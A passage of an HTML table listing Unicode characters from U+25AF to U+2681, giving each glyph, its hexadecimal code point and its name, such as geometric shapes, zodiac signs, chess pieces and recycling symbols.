</tr>
<tr>
<td style="text-align:center">▯</td>
<td style="text-align:center">25AF</td>
<td style="text-align:center">WHITE VERTICAL RECTANGLE</td>
</tr>
<tr>
<td style="text-align:center">▰</td>
<td style="text-align:center">25B0</td>
<td style="text-align:center">BLACK PARALLELOGRAM</td>
</tr>
<tr>
<td style="text-align:center">▱</td>
<td style="text-align:center">25B1</td>
<td style="text-align:center">WHITE PARALLELOGRAM</td>
</tr>
<tr>
<td style="text-align:center">▲</td>
<td style="text-align:center">25B2</td>
<td style="text-align:center">BLACK UP-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">△</td>
<td style="text-align:center">25B3</td>
<td style="text-align:center">WHITE UP-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▴</td>
<td style="text-align:center">25B4</td>
<td style="text-align:center">BLACK UP-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▵</td>
<td style="text-align:center">25B5</td>
<td style="text-align:center">WHITE UP-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▶</td>
<td style="text-align:center">25B6</td>
<td style="text-align:center">BLACK RIGHT-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▷</td>
<td style="text-align:center">25B7</td>
<td style="text-align:center">WHITE RIGHT-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▸</td>
<td style="text-align:center">25B8</td>
<td style="text-align:center">BLACK RIGHT-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▹</td>
<td style="text-align:center">25B9</td>
<td style="text-align:center">WHITE RIGHT-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">►</td>
<td style="text-align:center">25BA</td>
<td style="text-align:center">BLACK RIGHT-POINTING POINTER</td>
</tr>
<tr>
<td style="text-align:center">▻</td>
<td style="text-align:center">25BB</td>
<td style="text-align:center">WHITE RIGHT-POINTING POINTER</td>
</tr>
<tr>
<td style="text-align:center">▼</td>
<td style="text-align:center">25BC</td>
<td style="text-align:center">BLACK DOWN-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▽</td>
<td style="text-align:center">25BD</td>
<td style="text-align:center">WHITE DOWN-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▾</td>
<td style="text-align:center">25BE</td>
<td style="text-align:center">BLACK DOWN-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">▿</td>
<td style="text-align:center">25BF</td>
<td style="text-align:center">WHITE DOWN-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◀</td>
<td style="text-align:center">25C0</td>
<td style="text-align:center">BLACK LEFT-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◁</td>
<td style="text-align:center">25C1</td>
<td style="text-align:center">WHITE LEFT-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◂</td>
<td style="text-align:center">25C2</td>
<td style="text-align:center">BLACK LEFT-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◃</td>
<td style="text-align:center">25C3</td>
<td style="text-align:center">WHITE LEFT-POINTING SMALL TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◄</td>
<td style="text-align:center">25C4</td>
<td style="text-align:center">BLACK LEFT-POINTING POINTER</td>
</tr>
<tr>
<td style="text-align:center">◅</td>
<td style="text-align:center">25C5</td>
<td style="text-align:center">WHITE LEFT-POINTING POINTER</td>
</tr>
<tr>
<td style="text-align:center">◆</td>
<td style="text-align:center">25C6</td>
<td style="text-align:center">BLACK DIAMOND</td>
</tr>
<tr>
<td style="text-align:center">◇</td>
<td style="text-align:center">25C7</td>
<td style="text-align:center">WHITE DIAMOND</td>
</tr>
<tr>
<td style="text-align:center">◈</td>
<td style="text-align:center">25C8</td>
<td style="text-align:center">WHITE DIAMOND CONTAINING BLACK SMALL DIAMOND</td>
</tr>
<tr>
<td style="text-align:center">◉</td>
<td style="text-align:center">25C9</td>
<td style="text-align:center">FISHEYE</td>
</tr>
<tr>
<td style="text-align:center">◊</td>
<td style="text-align:center">25CA</td>
<td style="text-align:center">LOZENGE</td>
</tr>
<tr>
<td style="text-align:center">○</td>
<td style="text-align:center">25CB</td>
<td style="text-align:center">WHITE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◌</td>
<td style="text-align:center">25CC</td>
<td style="text-align:center">DOTTED CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◍</td>
<td style="text-align:center">25CD</td>
<td style="text-align:center">CIRCLE WITH VERTICAL FILL</td>
</tr>
<tr>
<td style="text-align:center">◎</td>
<td style="text-align:center">25CE</td>
<td style="text-align:center">BULLSEYE</td>
</tr>
<tr>
<td style="text-align:center">●</td>
<td style="text-align:center">25CF</td>
<td style="text-align:center">BLACK CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◐</td>
<td style="text-align:center">25D0</td>
<td style="text-align:center">CIRCLE WITH LEFT HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◑</td>
<td style="text-align:center">25D1</td>
<td style="text-align:center">CIRCLE WITH RIGHT HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◒</td>
<td style="text-align:center">25D2</td>
<td style="text-align:center">CIRCLE WITH LOWER HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◓</td>
<td style="text-align:center">25D3</td>
<td style="text-align:center">CIRCLE WITH UPPER HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◔</td>
<td style="text-align:center">25D4</td>
<td style="text-align:center">CIRCLE WITH UPPER RIGHT QUADRANT BLACK</td>
</tr>
<tr>
<td style="text-align:center">◕</td>
<td style="text-align:center">25D5</td>
<td style="text-align:center">CIRCLE WITH ALL BUT UPPER LEFT QUADRANT BLACK</td>
</tr>
<tr>
<td style="text-align:center">◖</td>
<td style="text-align:center">25D6</td>
<td style="text-align:center">LEFT HALF BLACK CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◗</td>
<td style="text-align:center">25D7</td>
<td style="text-align:center">RIGHT HALF BLACK CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◘</td>
<td style="text-align:center">25D8</td>
<td style="text-align:center">INVERSE BULLET</td>
</tr>
<tr>
<td style="text-align:center">◙</td>
<td style="text-align:center">25D9</td>
<td style="text-align:center">INVERSE WHITE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◚</td>
<td style="text-align:center">25DA</td>
<td style="text-align:center">UPPER HALF INVERSE WHITE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◛</td>
<td style="text-align:center">25DB</td>
<td style="text-align:center">LOWER HALF INVERSE WHITE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◜</td>
<td style="text-align:center">25DC</td>
<td style="text-align:center">UPPER LEFT QUADRANT CIRCULAR ARC</td>
</tr>
<tr>
<td style="text-align:center">◝</td>
<td style="text-align:center">25DD</td>
<td style="text-align:center">UPPER RIGHT QUADRANT CIRCULAR ARC</td>
</tr>
<tr>
<td style="text-align:center">◞</td>
<td style="text-align:center">25DE</td>
<td style="text-align:center">LOWER RIGHT QUADRANT CIRCULAR ARC</td>
</tr>
<tr>
<td style="text-align:center">◟</td>
<td style="text-align:center">25DF</td>
<td style="text-align:center">LOWER LEFT QUADRANT CIRCULAR ARC</td>
</tr>
<tr>
<td style="text-align:center">◠</td>
<td style="text-align:center">25E0</td>
<td style="text-align:center">UPPER HALF CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◡</td>
<td style="text-align:center">25E1</td>
<td style="text-align:center">LOWER HALF CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◢</td>
<td style="text-align:center">25E2</td>
<td style="text-align:center">BLACK LOWER RIGHT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◣</td>
<td style="text-align:center">25E3</td>
<td style="text-align:center">BLACK LOWER LEFT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◤</td>
<td style="text-align:center">25E4</td>
<td style="text-align:center">BLACK UPPER LEFT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◥</td>
<td style="text-align:center">25E5</td>
<td style="text-align:center">BLACK UPPER RIGHT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◦</td>
<td style="text-align:center">25E6</td>
<td style="text-align:center">WHITE BULLET</td>
</tr>
<tr>
<td style="text-align:center">◧</td>
<td style="text-align:center">25E7</td>
<td style="text-align:center">SQUARE WITH LEFT HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◨</td>
<td style="text-align:center">25E8</td>
<td style="text-align:center">SQUARE WITH RIGHT HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◩</td>
<td style="text-align:center">25E9</td>
<td style="text-align:center">SQUARE WITH UPPER LEFT DIAGONAL HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◪</td>
<td style="text-align:center">25EA</td>
<td style="text-align:center">SQUARE WITH LOWER RIGHT DIAGONAL HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◫</td>
<td style="text-align:center">25EB</td>
<td style="text-align:center">WHITE SQUARE WITH VERTICAL BISECTING LINE</td>
</tr>
<tr>
<td style="text-align:center">◬</td>
<td style="text-align:center">25EC</td>
<td style="text-align:center">WHITE UP-POINTING TRIANGLE WITH DOT</td>
</tr>
<tr>
<td style="text-align:center">◭</td>
<td style="text-align:center">25ED</td>
<td style="text-align:center">UP-POINTING TRIANGLE WITH LEFT HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◮</td>
<td style="text-align:center">25EE</td>
<td style="text-align:center">UP-POINTING TRIANGLE WITH RIGHT HALF BLACK</td>
</tr>
<tr>
<td style="text-align:center">◯</td>
<td style="text-align:center">25EF</td>
<td style="text-align:center">LARGE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">◰</td>
<td style="text-align:center">25F0</td>
<td style="text-align:center">WHITE SQUARE WITH UPPER LEFT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◱</td>
<td style="text-align:center">25F1</td>
<td style="text-align:center">WHITE SQUARE WITH LOWER LEFT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◲</td>
<td style="text-align:center">25F2</td>
<td style="text-align:center">WHITE SQUARE WITH LOWER RIGHT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◳</td>
<td style="text-align:center">25F3</td>
<td style="text-align:center">WHITE SQUARE WITH UPPER RIGHT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◴</td>
<td style="text-align:center">25F4</td>
<td style="text-align:center">WHITE CIRCLE WITH UPPER LEFT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◵</td>
<td style="text-align:center">25F5</td>
<td style="text-align:center">WHITE CIRCLE WITH LOWER LEFT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◶</td>
<td style="text-align:center">25F6</td>
<td style="text-align:center">WHITE CIRCLE WITH LOWER RIGHT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◷</td>
<td style="text-align:center">25F7</td>
<td style="text-align:center">WHITE CIRCLE WITH UPPER RIGHT QUADRANT</td>
</tr>
<tr>
<td style="text-align:center">◸</td>
<td style="text-align:center">25F8</td>
<td style="text-align:center">UPPER LEFT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◹</td>
<td style="text-align:center">25F9</td>
<td style="text-align:center">UPPER RIGHT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◺</td>
<td style="text-align:center">25FA</td>
<td style="text-align:center">LOWER LEFT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">◻</td>
<td style="text-align:center">25FB</td>
<td style="text-align:center">WHITE MEDIUM SQUARE</td>
</tr>
<tr>
<td style="text-align:center">◼</td>
<td style="text-align:center">25FC</td>
<td style="text-align:center">BLACK MEDIUM SQUARE</td>
</tr>
<tr>
<td style="text-align:center">◽</td>
<td style="text-align:center">25FD</td>
<td style="text-align:center">WHITE MEDIUM SMALL SQUARE</td>
</tr>
<tr>
<td style="text-align:center">◾</td>
<td style="text-align:center">25FE</td>
<td style="text-align:center">BLACK MEDIUM SMALL SQUARE</td>
</tr>
<tr>
<td style="text-align:center">◿</td>
<td style="text-align:center">25FF</td>
<td style="text-align:center">LOWER RIGHT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">☀</td>
<td style="text-align:center">2600</td>
<td style="text-align:center">BLACK SUN WITH RAYS</td>
</tr>
<tr>
<td style="text-align:center">☁</td>
<td style="text-align:center">2601</td>
<td style="text-align:center">CLOUD</td>
</tr>
<tr>
<td style="text-align:center">☂</td>
<td style="text-align:center">2602</td>
<td style="text-align:center">UMBRELLA</td>
</tr>
<tr>
<td style="text-align:center">☃</td>
<td style="text-align:center">2603</td>
<td style="text-align:center">SNOWMAN</td>
</tr>
<tr>
<td style="text-align:center">☄</td>
<td style="text-align:center">2604</td>
<td style="text-align:center">COMET</td>
</tr>
<tr>
<td style="text-align:center">★</td>
<td style="text-align:center">2605</td>
<td style="text-align:center">BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">☆</td>
<td style="text-align:center">2606</td>
<td style="text-align:center">WHITE STAR</td>
</tr>
<tr>
<td style="text-align:center">☇</td>
<td style="text-align:center">2607</td>
<td style="text-align:center">LIGHTNING</td>
</tr>
<tr>
<td style="text-align:center">☈</td>
<td style="text-align:center">2608</td>
<td style="text-align:center">THUNDERSTORM</td>
</tr>
<tr>
<td style="text-align:center">☉</td>
<td style="text-align:center">2609</td>
<td style="text-align:center">SUN</td>
</tr>
<tr>
<td style="text-align:center">☊</td>
<td style="text-align:center">260A</td>
<td style="text-align:center">ASCENDING NODE</td>
</tr>
<tr>
<td style="text-align:center">☋</td>
<td style="text-align:center">260B</td>
<td style="text-align:center">DESCENDING NODE</td>
</tr>
<tr>
<td style="text-align:center">☌</td>
<td style="text-align:center">260C</td>
<td style="text-align:center">CONJUNCTION</td>
</tr>
<tr>
<td style="text-align:center">☍</td>
<td style="text-align:center">260D</td>
<td style="text-align:center">OPPOSITION</td>
</tr>
<tr>
<td style="text-align:center">☎</td>
<td style="text-align:center">260E</td>
<td style="text-align:center">BLACK TELEPHONE</td>
</tr>
<tr>
<td style="text-align:center">☏</td>
<td style="text-align:center">260F</td>
<td style="text-align:center">WHITE TELEPHONE</td>
</tr>
<tr>
<td style="text-align:center">☐</td>
<td style="text-align:center">2610</td>
<td style="text-align:center">BALLOT BOX</td>
</tr>
<tr>
<td style="text-align:center">☑</td>
<td style="text-align:center">2611</td>
<td style="text-align:center">BALLOT BOX WITH CHECK</td>
</tr>
<tr>
<td style="text-align:center">☒</td>
<td style="text-align:center">2612</td>
<td style="text-align:center">BALLOT BOX WITH X</td>
</tr>
<tr>
<td style="text-align:center">☓</td>
<td style="text-align:center">2613</td>
<td style="text-align:center">SALTIRE</td>
</tr>
<tr>
<td style="text-align:center">☔</td>
<td style="text-align:center">2614</td>
<td style="text-align:center">UMBRELLA WITH RAIN DROPS</td>
</tr>
<tr>
<td style="text-align:center">☕</td>
<td style="text-align:center">2615</td>
<td style="text-align:center">HOT BEVERAGE</td>
</tr>
<tr>
<td style="text-align:center">☖</td>
<td style="text-align:center">2616</td>
<td style="text-align:center">WHITE SHOGI PIECE</td>
</tr>
<tr>
<td style="text-align:center">☗</td>
<td style="text-align:center">2617</td>
<td style="text-align:center">BLACK SHOGI PIECE</td>
</tr>
<tr>
<td style="text-align:center">☘</td>
<td style="text-align:center">2618</td>
<td style="text-align:center">SHAMROCK</td>
</tr>
<tr>
<td style="text-align:center">☙</td>
<td style="text-align:center">2619</td>
<td style="text-align:center">REVERSED ROTATED FLORAL HEART BULLET</td>
</tr>
<tr>
<td style="text-align:center">☚</td>
<td style="text-align:center">261A</td>
<td style="text-align:center">BLACK LEFT POINTING INDEX</td>
</tr>
<tr>
<td style="text-align:center">☛</td>
<td style="text-align:center">261B</td>
<td style="text-align:center">BLACK RIGHT POINTING INDEX</td>
</tr>
<tr>
<td style="text-align:center">☜</td>
<td style="text-align:center">261C</td>
<td style="text-align:center">WHITE LEFT POINTING INDEX</td>
</tr>
<tr>
<td style="text-align:center">☝</td>
<td style="text-align:center">261D</td>
<td style="text-align:center">WHITE UP POINTING INDEX</td>
</tr>
<tr>
<td style="text-align:center">☞</td>
<td style="text-align:center">261E</td>
<td style="text-align:center">WHITE RIGHT POINTING INDEX</td>
</tr>
<tr>
<td style="text-align:center">☟</td>
<td style="text-align:center">261F</td>
<td style="text-align:center">WHITE DOWN POINTING INDEX</td>
</tr>
<tr>
<td style="text-align:center">☠</td>
<td style="text-align:center">2620</td>
<td style="text-align:center">SKULL AND CROSSBONES</td>
</tr>
<tr>
<td style="text-align:center">☡</td>
<td style="text-align:center">2621</td>
<td style="text-align:center">CAUTION SIGN</td>
</tr>
<tr>
<td style="text-align:center">☢</td>
<td style="text-align:center">2622</td>
<td style="text-align:center">RADIOACTIVE SIGN</td>
</tr>
<tr>
<td style="text-align:center">☣</td>
<td style="text-align:center">2623</td>
<td style="text-align:center">BIOHAZARD SIGN</td>
</tr>
<tr>
<td style="text-align:center">☤</td>
<td style="text-align:center">2624</td>
<td style="text-align:center">CADUCEUS</td>
</tr>
<tr>
<td style="text-align:center">☥</td>
<td style="text-align:center">2625</td>
<td style="text-align:center">ANKH</td>
</tr>
<tr>
<td style="text-align:center">☦</td>
<td style="text-align:center">2626</td>
<td style="text-align:center">ORTHODOX CROSS</td>
</tr>
<tr>
<td style="text-align:center">☧</td>
<td style="text-align:center">2627</td>
<td style="text-align:center">CHI RHO</td>
</tr>
<tr>
<td style="text-align:center">☨</td>
<td style="text-align:center">2628</td>
<td style="text-align:center">CROSS OF LORRAINE</td>
</tr>
<tr>
<td style="text-align:center">☩</td>
<td style="text-align:center">2629</td>
<td style="text-align:center">CROSS OF JERUSALEM</td>
</tr>
<tr>
<td style="text-align:center">☪</td>
<td style="text-align:center">262A</td>
<td style="text-align:center">STAR AND CRESCENT</td>
</tr>
<tr>
<td style="text-align:center">☫</td>
<td style="text-align:center">262B</td>
<td style="text-align:center">FARSI SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">☬</td>
<td style="text-align:center">262C</td>
<td style="text-align:center">KHANDA</td>
</tr>
<tr>
<td style="text-align:center">☭</td>
<td style="text-align:center">262D</td>
<td style="text-align:center">HAMMER AND SICKLE</td>
</tr>
<tr>
<td style="text-align:center">☮</td>
<td style="text-align:center">262E</td>
<td style="text-align:center">PEACE SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">☯</td>
<td style="text-align:center">262F</td>
<td style="text-align:center">YIN YANG</td>
</tr>
<tr>
<td style="text-align:center">☰</td>
<td style="text-align:center">2630</td>
<td style="text-align:center">TRIGRAM FOR HEAVEN</td>
</tr>
<tr>
<td style="text-align:center">☱</td>
<td style="text-align:center">2631</td>
<td style="text-align:center">TRIGRAM FOR LAKE</td>
</tr>
<tr>
<td style="text-align:center">☲</td>
<td style="text-align:center">2632</td>
<td style="text-align:center">TRIGRAM FOR FIRE</td>
</tr>
<tr>
<td style="text-align:center">☳</td>
<td style="text-align:center">2633</td>
<td style="text-align:center">TRIGRAM FOR THUNDER</td>
</tr>
<tr>
<td style="text-align:center">☴</td>
<td style="text-align:center">2634</td>
<td style="text-align:center">TRIGRAM FOR WIND</td>
</tr>
<tr>
<td style="text-align:center">☵</td>
<td style="text-align:center">2635</td>
<td style="text-align:center">TRIGRAM FOR WATER</td>
</tr>
<tr>
<td style="text-align:center">☶</td>
<td style="text-align:center">2636</td>
<td style="text-align:center">TRIGRAM FOR MOUNTAIN</td>
</tr>
<tr>
<td style="text-align:center">☷</td>
<td style="text-align:center">2637</td>
<td style="text-align:center">TRIGRAM FOR EARTH</td>
</tr>
<tr>
<td style="text-align:center">☸</td>
<td style="text-align:center">2638</td>
<td style="text-align:center">WHEEL OF DHARMA</td>
</tr>
<tr>
<td style="text-align:center">☹</td>
<td style="text-align:center">2639</td>
<td style="text-align:center">WHITE FROWNING FACE</td>
</tr>
<tr>
<td style="text-align:center">☺</td>
<td style="text-align:center">263A</td>
<td style="text-align:center">WHITE SMILING FACE</td>
</tr>
<tr>
<td style="text-align:center">☻</td>
<td style="text-align:center">263B</td>
<td style="text-align:center">BLACK SMILING FACE</td>
</tr>
<tr>
<td style="text-align:center">☼</td>
<td style="text-align:center">263C</td>
<td style="text-align:center">WHITE SUN WITH RAYS</td>
</tr>
<tr>
<td style="text-align:center">☽</td>
<td style="text-align:center">263D</td>
<td style="text-align:center">FIRST QUARTER MOON</td>
</tr>
<tr>
<td style="text-align:center">☾</td>
<td style="text-align:center">263E</td>
<td style="text-align:center">LAST QUARTER MOON</td>
</tr>
<tr>
<td style="text-align:center">☿</td>
<td style="text-align:center">263F</td>
<td style="text-align:center">MERCURY</td>
</tr>
<tr>
<td style="text-align:center">♀</td>
<td style="text-align:center">2640</td>
<td style="text-align:center">FEMALE SIGN</td>
</tr>
<tr>
<td style="text-align:center">♁</td>
<td style="text-align:center">2641</td>
<td style="text-align:center">EARTH</td>
</tr>
<tr>
<td style="text-align:center">♂</td>
<td style="text-align:center">2642</td>
<td style="text-align:center">MALE SIGN</td>
</tr>
<tr>
<td style="text-align:center">♃</td>
<td style="text-align:center">2643</td>
<td style="text-align:center">JUPITER</td>
</tr>
<tr>
<td style="text-align:center">♄</td>
<td style="text-align:center">2644</td>
<td style="text-align:center">SATURN</td>
</tr>
<tr>
<td style="text-align:center">♅</td>
<td style="text-align:center">2645</td>
<td style="text-align:center">URANUS</td>
</tr>
<tr>
<td style="text-align:center">♆</td>
<td style="text-align:center">2646</td>
<td style="text-align:center">NEPTUNE</td>
</tr>
<tr>
<td style="text-align:center">♇</td>
<td style="text-align:center">2647</td>
<td style="text-align:center">PLUTO</td>
</tr>
<tr>
<td style="text-align:center">♈</td>
<td style="text-align:center">2648</td>
<td style="text-align:center">ARIES</td>
</tr>
<tr>
<td style="text-align:center">♉</td>
<td style="text-align:center">2649</td>
<td style="text-align:center">TAURUS</td>
</tr>
<tr>
<td style="text-align:center">♊</td>
<td style="text-align:center">264A</td>
<td style="text-align:center">GEMINI</td>
</tr>
<tr>
<td style="text-align:center">♋</td>
<td style="text-align:center">264B</td>
<td style="text-align:center">CANCER</td>
</tr>
<tr>
<td style="text-align:center">♌</td>
<td style="text-align:center">264C</td>
<td style="text-align:center">LEO</td>
</tr>
<tr>
<td style="text-align:center">♍</td>
<td style="text-align:center">264D</td>
<td style="text-align:center">VIRGO</td>
</tr>
<tr>
<td style="text-align:center">♎</td>
<td style="text-align:center">264E</td>
<td style="text-align:center">LIBRA</td>
</tr>
<tr>
<td style="text-align:center">♏</td>
<td style="text-align:center">264F</td>
<td style="text-align:center">SCORPIUS</td>
</tr>
<tr>
<td style="text-align:center">♐</td>
<td style="text-align:center">2650</td>
<td style="text-align:center">SAGITTARIUS</td>
</tr>
<tr>
<td style="text-align:center">♑</td>
<td style="text-align:center">2651</td>
<td style="text-align:center">CAPRICORN</td>
</tr>
<tr>
<td style="text-align:center">♒</td>
<td style="text-align:center">2652</td>
<td style="text-align:center">AQUARIUS</td>
</tr>
<tr>
<td style="text-align:center">♓</td>
<td style="text-align:center">2653</td>
<td style="text-align:center">PISCES</td>
</tr>
<tr>
<td style="text-align:center">♔</td>
<td style="text-align:center">2654</td>
<td style="text-align:center">WHITE CHESS KING</td>
</tr>
<tr>
<td style="text-align:center">♕</td>
<td style="text-align:center">2655</td>
<td style="text-align:center">WHITE CHESS QUEEN</td>
</tr>
<tr>
<td style="text-align:center">♖</td>
<td style="text-align:center">2656</td>
<td style="text-align:center">WHITE CHESS ROOK</td>
</tr>
<tr>
<td style="text-align:center">♗</td>
<td style="text-align:center">2657</td>
<td style="text-align:center">WHITE CHESS BISHOP</td>
</tr>
<tr>
<td style="text-align:center">♘</td>
<td style="text-align:center">2658</td>
<td style="text-align:center">WHITE CHESS KNIGHT</td>
</tr>
<tr>
<td style="text-align:center">♙</td>
<td style="text-align:center">2659</td>
<td style="text-align:center">WHITE CHESS PAWN</td>
</tr>
<tr>
<td style="text-align:center">♚</td>
<td style="text-align:center">265A</td>
<td style="text-align:center">BLACK CHESS KING</td>
</tr>
<tr>
<td style="text-align:center">♛</td>
<td style="text-align:center">265B</td>
<td style="text-align:center">BLACK CHESS QUEEN</td>
</tr>
<tr>
<td style="text-align:center">♜</td>
<td style="text-align:center">265C</td>
<td style="text-align:center">BLACK CHESS ROOK</td>
</tr>
<tr>
<td style="text-align:center">♝</td>
<td style="text-align:center">265D</td>
<td style="text-align:center">BLACK CHESS BISHOP</td>
</tr>
<tr>
<td style="text-align:center">♞</td>
<td style="text-align:center">265E</td>
<td style="text-align:center">BLACK CHESS KNIGHT</td>
</tr>
<tr>
<td style="text-align:center">♟</td>
<td style="text-align:center">265F</td>
<td style="text-align:center">BLACK CHESS PAWN</td>
</tr>
<tr>
<td style="text-align:center">♠</td>
<td style="text-align:center">2660</td>
<td style="text-align:center">BLACK SPADE SUIT</td>
</tr>
<tr>
<td style="text-align:center">♡</td>
<td style="text-align:center">2661</td>
<td style="text-align:center">WHITE HEART SUIT</td>
</tr>
<tr>
<td style="text-align:center">♢</td>
<td style="text-align:center">2662</td>
<td style="text-align:center">WHITE DIAMOND SUIT</td>
</tr>
<tr>
<td style="text-align:center">♣</td>
<td style="text-align:center">2663</td>
<td style="text-align:center">BLACK CLUB SUIT</td>
</tr>
<tr>
<td style="text-align:center">♤</td>
<td style="text-align:center">2664</td>
<td style="text-align:center">WHITE SPADE SUIT</td>
</tr>
<tr>
<td style="text-align:center">♥</td>
<td style="text-align:center">2665</td>
<td style="text-align:center">BLACK HEART SUIT</td>
</tr>
<tr>
<td style="text-align:center">♦</td>
<td style="text-align:center">2666</td>
<td style="text-align:center">BLACK DIAMOND SUIT</td>
</tr>
<tr>
<td style="text-align:center">♧</td>
<td style="text-align:center">2667</td>
<td style="text-align:center">WHITE CLUB SUIT</td>
</tr>
<tr>
<td style="text-align:center">♨</td>
<td style="text-align:center">2668</td>
<td style="text-align:center">HOT SPRINGS</td>
</tr>
<tr>
<td style="text-align:center">♩</td>
<td style="text-align:center">2669</td>
<td style="text-align:center">QUARTER NOTE</td>
</tr>
<tr>
<td style="text-align:center">♪</td>
<td style="text-align:center">266A</td>
<td style="text-align:center">EIGHTH NOTE</td>
</tr>
<tr>
<td style="text-align:center">♫</td>
<td style="text-align:center">266B</td>
<td style="text-align:center">BEAMED EIGHTH NOTES</td>
</tr>
<tr>
<td style="text-align:center">♬</td>
<td style="text-align:center">266C</td>
<td style="text-align:center">BEAMED SIXTEENTH NOTES</td>
</tr>
<tr>
<td style="text-align:center">♭</td>
<td style="text-align:center">266D</td>
<td style="text-align:center">MUSIC FLAT SIGN</td>
</tr>
<tr>
<td style="text-align:center">♮</td>
<td style="text-align:center">266E</td>
<td style="text-align:center">MUSIC NATURAL SIGN</td>
</tr>
<tr>
<td style="text-align:center">♯</td>
<td style="text-align:center">266F</td>
<td style="text-align:center">MUSIC SHARP SIGN</td>
</tr>
<tr>
<td style="text-align:center">♰</td>
<td style="text-align:center">2670</td>
<td style="text-align:center">WEST SYRIAC CROSS</td>
</tr>
<tr>
<td style="text-align:center">♱</td>
<td style="text-align:center">2671</td>
<td style="text-align:center">EAST SYRIAC CROSS</td>
</tr>
<tr>
<td style="text-align:center">♲</td>
<td style="text-align:center">2672</td>
<td style="text-align:center">UNIVERSAL RECYCLING SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">♳</td>
<td style="text-align:center">2673</td>
<td style="text-align:center">RECYCLING SYMBOL FOR TYPE-1 PLASTICS</td>
</tr>
<tr>
<td style="text-align:center">♴</td>
<td style="text-align:center">2674</td>
<td style="text-align:center">RECYCLING SYMBOL FOR TYPE-2 PLASTICS</td>
</tr>
<tr>
<td style="text-align:center">♵</td>
<td style="text-align:center">2675</td>
<td style="text-align:center">RECYCLING SYMBOL FOR TYPE-3 PLASTICS</td>
</tr>
<tr>
<td style="text-align:center">♶</td>
<td style="text-align:center">2676</td>
<td style="text-align:center">RECYCLING SYMBOL FOR TYPE-4 PLASTICS</td>
</tr>
<tr>
<td style="text-align:center">♷</td>
<td style="text-align:center">2677</td>
<td style="text-align:center">RECYCLING SYMBOL FOR TYPE-5 PLASTICS</td>
</tr>
<tr>
<td style="text-align:center">♸</td>
<td style="text-align:center">2678</td>
<td style="text-align:center">RECYCLING SYMBOL FOR TYPE-6 PLASTICS</td>
</tr>
<tr>
<td style="text-align:center">♹</td>
<td style="text-align:center">2679</td>
<td style="text-align:center">RECYCLING SYMBOL FOR TYPE-7 PLASTICS</td>
</tr>
<tr>
<td style="text-align:center">♺</td>
<td style="text-align:center">267A</td>
<td style="text-align:center">RECYCLING SYMBOL FOR GENERIC MATERIALS</td>
</tr>
<tr>
<td style="text-align:center">♻</td>
<td style="text-align:center">267B</td>
<td style="text-align:center">BLACK UNIVERSAL RECYCLING SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">♼</td>
<td style="text-align:center">267C</td>
<td style="text-align:center">RECYCLED PAPER SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">♽</td>
<td style="text-align:center">267D</td>
<td style="text-align:center">PARTIALLY-RECYCLED PAPER SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">♾</td>
<td style="text-align:center">267E</td>
<td style="text-align:center">PERMANENT PAPER SIGN</td>
</tr>
<tr>
<td style="text-align:center">♿</td>
<td style="text-align:center">267F</td>
<td style="text-align:center">WHEELCHAIR SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">⚀</td>
<td style="text-align:center">2680</td>
<td style="text-align:center">DIE FACE-1</td>
</tr>
<tr>
<td style="text-align:center">⚁</td>
